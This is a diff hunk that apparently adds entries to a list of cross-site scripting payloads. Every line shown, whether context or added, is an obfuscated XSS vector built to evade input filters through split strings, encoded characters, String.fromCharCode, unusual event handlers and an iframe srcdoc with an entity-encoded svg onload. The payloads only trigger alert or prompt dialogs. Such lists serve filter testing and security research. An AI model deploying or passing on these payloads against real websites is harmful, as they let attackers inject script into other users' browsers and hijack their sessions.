@@ -66,4 +66,6 @@ on<>mouseover="ale<>rt()">
 « <svg onload\r\n=$.globalEval("al"+"ert()");> »
 « <svg/onload=self[`aler`%2b`t`]`1`> »
 <bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
-
+\%3C/onscroll/=1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))%3E
+{` <body \< onscroll =1(_=prompt,_(String.fromCharCode(88,83,83,32,66,121,32,77,111,114,112,104,105,110,101)))> ´}
+ <iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
